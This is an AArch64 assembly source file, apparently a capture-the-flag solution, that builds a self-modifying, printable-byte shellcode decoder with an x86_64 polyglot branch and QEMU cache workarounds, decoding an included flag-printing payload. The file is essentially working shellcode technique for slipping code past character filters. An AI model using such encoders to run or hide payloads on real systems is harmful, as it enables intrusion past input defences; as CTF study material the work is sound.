.global _start
.text

# Assumptions from debugging:
#   X0,X1 is shellcode address
#   W9 is 0xffffffff
#   W11 is 0
#   W26 is 0
#   W27 is 0
_start:
    # Change W2 to be 'pool_start_in_middle_of_tbz - _start'
    # (Which is 0x6d)
    # W2 is the offset in which we write the decoded shellcode
    ANDS    W2, W27, W27, lsr #12
    ADDS    W2, W2, #4044
    SUBS    W2, W2, #3994
    ADDS    W2, W2, #4047
    SUBS    W2, W2, #3988

    # Fix TBZ byte to make its offset correct
    # This makes the last byte of W9 = 0xfe, and writes them
    ADDS    W9, W9, #0xC19
    SUBS    W9, W9, #0xC1A
    STRB    W9, [X2, X0]

    # Set W26 = 1
    ADDS    W26, W26, #0xC1A
    SUBS    W26, W26, #0xC19

    # Change W11 to be 'encoded_shellcode - _start'
    # (Which is 0x70)
    # W11 is the offset from which we read the encoded shellcode
    ANDS    W11, W27, W27, lsr #12
    ADDS    W11, W11, #3978
    SUBS    W11, W11, #3866

/* Branch to code */
loop:
    /* This opcode does nothing, but it is necessary, as the loop size
     * must be large enough to fit in the TBZ instruction.
     */
    ADDS    W7, W9, #0x80a

    /* This CBZ is actually NOP (as W2 is by defintion non-zero here).
     * We put it here in order to make sure the patching of the TBZ will work.
     * ARM have a well-known shellcoding issue with i-cache and d-cache synchronization.
     * Because we run the payload in QEMU, and we assume QEMU it JIT-ing the code by
     * JIT-ing each basic-block, we create here a new basic block and hope that QEMU
     * will JIT the "TBZ" only after our patch.
     * We're not 100% this is the real explanation - but works in practice!
     */
cbz_:
    CBZ     W2, cbz_+608324

    /* Load first byte in A */
    LDRB    W18, [X11, X0]

    /* W11++ */
    ADDS    W11, W11, W26, uxth

    /* Load second byte in B */
    LDRB    W25, [X11, X0]

    /* Mix A and B */
    EON     W18, W27, W18, lsl #20
    .word 0x72304f39 /* ANDS W25, W25, #0xFFFF000F (printable version ;) ) */
    EON     W25, W25, W18, lsr #16

    /* Write decoded shellcode byte into the end */
    STRB    W25, [X2, X0]

    /* W11++ */
    ADDS    W11, W11, W26, uxth
    
    /* W2++ */
    ADDS    W2, W2, W26, uxth

    /* This CBZ is with the same rationale as before - effectively NOP, but
     * helps us to deal with cache problems in QEMU. */
cbz2_:
    CBZ     W2, cbz2_+608324

    # This is NOP in aarch64, but jumps ahead in x86_64
    # This is needed because the first polymorphic instruction can branch
    # to a maximum offset of 0x7f 
x86_branch_opcode:
    .byte 0x72
    .byte 0x60
    .byte 0x7e
    .byte 0x51

    /* Branch to another iteration of the loop.
    /* This is actually "TBZ W2, #0x8, loop".
     * We overwrote the problematic byte (0xfe) so this instruction could work ;)
     */
tbz_opcode:
    .byte 0x62
pool_start_in_middle_of_tbz:
    .byte 0x20      /* Should be ".byte 0xfe" - will be overwritten (twice) */
    .byte 0x47
    .byte 0x36

encoded_shellcode:
    # .ascii "ONDGCF"     /* Base to generate "TBZ" opcode - will be autogenerated */
    .incbin "aarch64_print_flag_encoded.bin"
    
    # The padding is not needed - but we optimized 'aarch64_print_flag' shellcode, and
    # we don't want to fix the offsets of everything else ;)
    # (padding = 18 bytes)
padding:
    .byte 0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43
    .byte 0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43 ,0x43
